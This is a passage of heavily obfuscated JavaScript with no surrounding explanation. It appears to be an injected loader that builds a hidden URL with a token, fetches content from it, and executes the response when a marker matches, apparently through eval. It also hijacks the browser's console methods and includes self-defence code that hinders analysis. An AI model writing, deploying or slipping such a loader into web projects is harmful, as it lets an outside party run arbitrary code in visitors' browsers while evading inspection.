HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};